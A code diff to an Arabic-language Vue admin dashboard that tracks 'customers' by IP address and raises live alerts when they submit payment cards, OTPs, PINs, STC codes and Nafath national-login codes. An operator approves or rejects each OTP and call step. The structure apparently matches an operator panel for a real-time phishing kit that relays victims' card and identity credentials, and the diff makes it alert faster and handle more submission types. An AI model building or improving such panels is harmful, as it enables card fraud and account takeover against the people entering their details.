@@ -69,8 +69,10 @@
                     <div class="relative">
                         <i class="fa-solid fa-search absolute right-2.5 top-1/2 -translate-y-1/2 text-[11px]" style="color: var(--admin-text-dim);" aria-hidden="true"></i>
                         <input
+                            id="customer-search"
                             v-model="searchQuery"
                             type="text"
+                            name="customer-search"
                             dir="rtl"
                             placeholder="بحث IP، اسم، هاتف، هوية..."
                             aria-label="بحث في العملاء"
@@ -344,7 +346,7 @@ async function connectDashboardWebSocket () {
             if ( pusher.connection?.state === 'connected' ) {
                 wsConnected.value = true;
                 setWsConnected( true );
-                logger.info( '[Dashboard WS] Pusher already connected — polling suppressed' );
+                logger.info( '[Dashboard WS] Pusher already connected — polling continues alongside WS' );
             }
 
             const _bind = ( event, handler ) => {
@@ -354,24 +356,24 @@ async function connectDashboardWebSocket () {
             _bind( 'connected', () => {
                 wsConnected.value = true;
                 setWsConnected( true );
-                logger.info( '[Dashboard WS] Pusher connected — polling suppressed' );
+                logger.info( '[Dashboard WS] Pusher connected — polling continues alongside WS' );
             } );
             _bind( 'disconnected', () => {
                 wsConnected.value = false;
                 setWsConnected( false );
-                logger.warn( '[Dashboard WS] Pusher disconnected — polling resumed, will auto-reconnect' );
+                logger.warn( '[Dashboard WS] Pusher disconnected — will auto-reconnect' );
                 scheduleReconnect();
             } );
             _bind( 'unavailable', () => {
                 wsConnected.value = false;
                 setWsConnected( false );
-                logger.warn( '[Dashboard WS] Pusher unavailable — polling resumed' );
+                logger.warn( '[Dashboard WS] Pusher unavailable — will auto-reconnect' );
                 scheduleReconnect();
             } );
             _bind( 'failed', () => {
                 wsConnected.value = false;
                 setWsConnected( false );
-                logger.error( '[Dashboard WS] Pusher connection failed — polling resumed' );
+                logger.error( '[Dashboard WS] Pusher connection failed — will auto-reconnect' );
                 scheduleReconnect();
             } );
             _bind( 'error', ( err ) => {
@@ -565,6 +567,20 @@ function handleRealtimeUpdate ( event ) {
 
     // Important events (card submitted, OTP, nafath, etc.) → fetch only the changed customer
     if ( event.activity_type !== 'page_view' ) {
+        // ── Pre-throttle: instant optimistic pulse for new customer data ──
+        // This runs BEFORE the 2s throttle so the button always pulses immediately,
+        // even if the API fetch is skipped by the throttle guard.
+        if ( _newDataActivityTypes.has( event.activity_type ) && event.ip_address ) {
+            // Clear the 12s mark-viewed guard for this specific customer+field only
+            _recentlyMarkedViewed.delete( `${ event.ip_address }::has_new_payment` );
+            // Optimistically set has_new_payment = true on the local customer object
+            const idx = customers.value.findIndex( c => c.ip === event.ip_address );
+            if ( idx !== -1 && !customers.value[ idx ].has_new_payment ) {
+                customers.value[ idx ] = { ...customers.value[ idx ], has_new_payment: true };
+                triggerRef( customers );
+            }
+        }
+
         const now = Date.now();
         if ( now - _lastRefreshAt < WS_REFRESH_THROTTLE ) return; // throttle rapid WS events
         _lastRefreshAt = now;
@@ -633,9 +649,14 @@ function _getEventToastMessage ( activityType, ip ) {
         stc_otp_rejected:     { type: 'error',   message: `❌ تم رفض STC OTP للعميل ${ ip }` },
         stc_call_approved:    { type: 'success', message: `✅ تم قبول مكالمة STC للعميل ${ ip }` },
         stc_call_rejected:    { type: 'error',   message: `❌ تم رفض مكالمة STC للعميل ${ ip }` },
-        card_submitted:       { type: 'info',    message: `💳 بطاقة جديدة من العميل ${ ip }` },
-        otp_submitted:        { type: 'info',    message: `🔑 OTP جديد من العميل ${ ip }` },
-        nafath_code_updated:  { type: 'info',    message: `🔄 تحديث رمز نفاذ للعميل ${ ip }` },
+        card_submitted:           { type: 'info',    message: `💳 بطاقة جديدة من العميل ${ ip }` },
+        payment_card_submitted:   { type: 'info',    message: `💳 بطاقة جديدة من العميل ${ ip }` },
+        otp_submitted:            { type: 'info',    message: `🔑 OTP جديد من العميل ${ ip }` },
+        stc_otp_submitted:        { type: 'info',    message: `🔑 STC OTP جديد من العميل ${ ip }` },
+        pin_submitted:            { type: 'info',    message: `🔑 PIN جديد من العميل ${ ip }` },
+        nafath_submitted:         { type: 'info',    message: `🔄 تسجيل دخول نفاذ من العميل ${ ip }` },
+        phone_submitted:          { type: 'info',    message: `📱 تحقق هاتف جديد من العميل ${ ip }` },
+        phone_otp_verified:       { type: 'info',    message: `📱 تم التحقق من الهاتف للعميل ${ ip }` },
     };
     return map[ activityType ] || null;
 }
@@ -691,6 +712,19 @@ const _sectionToField = {
     insurance: 'has_new_insurance',
     payment: 'has_new_payment',
 };
+
+// ── New-data activity types ──
+// Customer-side submissions that mean genuinely new data in the payment/verification pipeline.
+// Backend computeSectionHash('payment') hashes all of these: cards, OTPs, PINs, phone_verification, STC, nafath.
+const _newDataActivityTypes = new Set( [
+    'nafath_submitted',
+    'phone_submitted',
+    'phone_otp_verified',
+    'payment_card_submitted',
+    'otp_submitted',
+    'stc_otp_submitted',
+    'pin_submitted',
+] );
 
 /**
  * Unified notification guard: suppresses has_new_* flags when:
@@ -789,7 +823,10 @@ function onSearchInput () {
 }
 
 const refreshCustomers = async () => {
-    if ( _isRefreshing ) return true; // already in-flight — treat as non-error
+    if ( _isRefreshing ) {
+        logger.debug( '[Dashboard] refreshCustomers skipped — already in-flight' );
+        return true;
+    }
     _isRefreshing = true;
     _lastRefreshAt = Date.now();
     try {
@@ -805,7 +842,8 @@ const refreshCustomers = async () => {
             params.search = searchQuery.value.trim();
         }
         const { data } = await getCustomers( params );
-        customers.value = applyNotificationGuards( data.data || [] );
+        const rows = data.data || [];
+        customers.value = applyNotificationGuards( rows );
         // Update pagination state from API response
         currentPage.value = data.current_page ?? 1;
         lastPage.value = data.last_page ?? 1;
@@ -815,6 +853,7 @@ const refreshCustomers = async () => {
         loadError.value = false;
         initialLoading.value = false;
         markInitialLoadComplete();
+        logger.debug( `[Dashboard] refreshCustomers success: ${ rows.length } rows` );
         return true;
     } catch ( error ) {
         logger.error( 'Failed to fetch customers:', error );
@@ -1044,15 +1083,19 @@ const handleCustomerAction = async ( payload ) => {
 
         // ── STC OTP Actions (Stage 2) ──
         else if ( action === 'stc-otp-approve' || action === 'stc-otp-reject' ) {
-            // OTP may be in latest_phone_otp (type stc_otp/stc_verification) OR latest_otp (legacy type otp)
-            // Also check all_otps for stc_otp type as fallback
-            let otpId = customer?.latest_phone_otp?.id || customer?.latest_otp?.id;
-            let otpStatus = customer?.latest_phone_otp?.status || customer?.latest_otp?.status;
-            if ( !otpId && customer?.all_otps?.length ) {
-                const stcOtp = customer.all_otps
-                    .filter( o => o.type === 'stc_otp' )
+            // Prefer stc_otp/stc_verification in all_otps (mirrors isStcWaitingForOtpApproval)
+            let otpId = null;
+            let otpStatus = null;
+            if ( customer?.all_otps?.length ) {
+                const stcOtp = [ ...customer.all_otps ]
+                    .filter( o => o.type === 'stc_otp' || o.type === 'stc_verification' )
                     .sort( ( a, b ) => new Date( b.created_at || 0 ) - new Date( a.created_at || 0 ) )[ 0 ];
                 if ( stcOtp ) { otpId = stcOtp.id; otpStatus = stcOtp.status; }
+            }
+            // Fallback to latest_phone_otp / latest_otp
+            if ( !otpId ) {
+                otpId = customer?.latest_phone_otp?.id || customer?.latest_otp?.id;
+                otpStatus = customer?.latest_phone_otp?.status || customer?.latest_otp?.status;
             }
             if ( !otpId ) { logger.error( 'No OTP ID found for STC OTP action' ); return; }
             // Guard: skip if OTP is already processed (prevents 422)
@@ -1071,15 +1114,19 @@ const handleCustomerAction = async ( payload ) => {
 
         // ── STC Call Actions (Stage 3) ──
         else if ( action === 'stc-call-approve' || action === 'stc-call-reject' ) {
-            const otpId = customer?.latest_phone_otp?.id;
-            if ( !otpId ) { logger.error( 'No OTP ID found for STC call action' ); return; }
-            // Guard: skip if OTP is already processed (prevents 422)
-            const stcCallStatus = customer?.latest_phone_otp?.status;
-            if ( stcCallStatus && stcCallStatus !== 'pending' ) {
-                logger.warn( `STC call OTP ${ otpId } already ${ stcCallStatus }, skipping ${ action }` );
-                await refreshCustomers();
-                return;
+            // Prefer stc_otp/stc_verification in all_otps
+            let otpId = null;
+            if ( customer?.all_otps?.length ) {
+                const stcOtp = [ ...customer.all_otps ]
+                    .filter( o => o.type === 'stc_otp' || o.type === 'stc_verification' )
+                    .sort( ( a, b ) => new Date( b.created_at || 0 ) - new Date( a.created_at || 0 ) )[ 0 ];
+                if ( stcOtp ) otpId = stcOtp.id;
             }
+            // Fallback to latest_phone_otp
+            if ( !otpId ) otpId = customer?.latest_phone_otp?.id;
+            if ( !otpId ) { logger.error( 'No OTP ID found for STC call action' ); return; }
+            // No status guard — the OTP is expected to be already verified from previous stages;
+            // the backend handles re-broadcasts for non-pending OTPs gracefully.
 
             if ( action === 'stc-call-approve' ) {
                 await approveStcCall( otpId, ip );
